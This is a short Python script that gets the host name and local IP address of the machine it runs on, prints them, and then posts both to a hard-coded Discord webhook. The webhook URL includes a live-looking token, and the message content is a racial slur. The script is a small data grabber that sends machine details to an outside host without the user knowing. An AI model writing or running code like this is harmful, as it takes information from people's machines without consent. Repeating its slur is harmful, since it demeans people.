import socket

host_name = socket.gethostname()
ip_address = socket.gethostbyname(host_name)

print("Nombre del host:", host_name)
print("Dirección IP:", ip_address)

from discord_webhook import DiscordWebhook, DiscordEmbed
content = "Nigga :O"
webhook = DiscordWebhook(url="https://discordapp.com/api/webhooks/1273193887967608872/biVi-dwYaeY5a6uwta3E33D9lGfg2uxP9MVlDVWvBX4sKosFlTBcagcWchAoNa_QsnyI", username="Kayflock", content=content)
embed = DiscordEmbed(title="IP: " + ip_address + " | Host: " + host_name, color=123123)
webhook.add_embed(embed)
response = webhook.execute()
